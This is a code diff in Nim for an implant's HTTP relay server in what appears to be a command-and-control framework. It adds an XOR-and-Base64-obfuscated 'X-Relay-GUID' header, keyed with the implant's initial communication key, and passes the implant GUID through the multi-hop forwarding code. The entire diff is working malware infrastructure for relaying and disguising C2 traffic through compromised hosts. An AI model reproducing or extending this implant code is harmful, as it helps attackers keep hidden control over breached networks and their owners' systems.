@@ -66,8 +66,16 @@ proc parseHttpRequest(data: string): HttpRequest =
     if i < lines.len:
         result.body = lines[i..^1].join("\r\n")
 
+# Encrypt relay GUID for X-Relay-GUID header (XOR + Base64)
+proc encryptRelayGuid(guid: string): string =
+    # XOR with INITIAL_XOR_KEY (same key used for INITIAL communication)
+    let xored = xorString(guid, INITIAL_XOR_KEY)
+    result = base64.encode(xored)
+    when defined debug:
+        echo "[RELAY] 🔐 Encrypted relay GUID: " & guid & " -> " & result
+
 # Forward HTTP request to next hop
-proc forwardRequest(nextHop: string, req: HttpRequest): string =
+proc forwardRequest(nextHop: string, req: HttpRequest, relayGuid: string = ""): string =
     when defined debug:
         echo "[RELAY] 🔀 Forwarding to: " & nextHop
         echo "[RELAY] 🔀 Method: " & req.`method` & " Path: " & req.path
@@ -91,9 +99,20 @@ proc forwardRequest(nextHop: string, req: HttpRequest): string =
         # Build HTTP request
         var request = req.`method` & " " & req.path & " HTTP/1.1\r\n"
         
-        # Add headers
+        # Add original headers (skip X-Relay-GUID to avoid duplicates in multi-hop)
         for (key, value) in req.headers:
-            request.add(key & ": " & value & "\r\n")
+            if key.toLower() != "x-relay-guid":
+                request.add(key & ": " & value & "\r\n")
+            else:
+                when defined debug:
+                    echo "[RELAY] 🗑️ Removed existing X-Relay-GUID header (multi-hop cleanup)"
+        
+        # Inject THIS relay's GUID (replacing any previous one)
+        if relayGuid != "":
+            let encryptedGuid = encryptRelayGuid(relayGuid)
+            request.add("X-Relay-GUID: " & encryptedGuid & "\r\n")
+            when defined debug:
+                echo "[RELAY] 🏷️ Injected X-Relay-GUID: " & relayGuid
         
         # Add blank line and body
         request.add("\r\n")
@@ -135,7 +154,7 @@ proc forwardRequest(nextHop: string, req: HttpRequest): string =
         return ""
 
 # Handle incoming connection
-proc handleRelayConnection(client: Socket) =
+proc handleRelayConnection(client: Socket, relayGuid: string = "") =
     when defined debug:
         echo "[RELAY] 🔌 New connection"
     
@@ -189,8 +208,8 @@ proc handleRelayConnection(client: Socket) =
             client.close()
             return
         
-        # Forward request
-        let response = forwardRequest(nextHop, req)
+        # Forward request with relay GUID
+        let response = forwardRequest(nextHop, req, relayGuid)
         
         if response != "":
             client.send(response)
@@ -208,8 +227,9 @@ proc handleRelayConnection(client: Socket) =
         except:
             discard
 
-# Start HTTP relay server
-proc startHttpRelayServer*(port: int): HttpRelayServer =
+# Start HTTP relay server with implant GUID
+# The relayGuid should be the actual implant GUID from the listener
+proc startHttpRelayServer*(port: int, implantGuid: string = ""): HttpRelayServer =
     when defined debug:
         echo "[RELAY] 🚀 Starting HTTP relay server on port " & $port
     
@@ -225,6 +245,16 @@ proc startHttpRelayServer*(port: int): HttpRelayServer =
         
         echo "[RELAY] ✅ HTTP relay server started on port " & $port
         
+        # Use provided implant GUID or placeholder
+        var relayGuid = implantGuid
+        if relayGuid == "":
+            when defined debug:
+                echo "[RELAY] ⚠️ WARNING: No implant GUID provided, using placeholder"
+            relayGuid = "RELAY-UNREGISTERED"
+        
+        when defined debug:
+            echo "[RELAY] 🆔 Using implant GUID: " & relayGuid
+        
         # Accept connections loop
         while true:
             var client: Socket
@@ -232,7 +262,7 @@ proc startHttpRelayServer*(port: int): HttpRelayServer =
             result.socket.accept(client)
             
             # Handle in separate thread/async (for now, synchronous)
-            handleRelayConnection(client)
+            handleRelayConnection(client, relayGuid)
             
     except:
         echo "[RELAY] ❌ Failed to start relay server: " & getCurrentExceptionMsg()
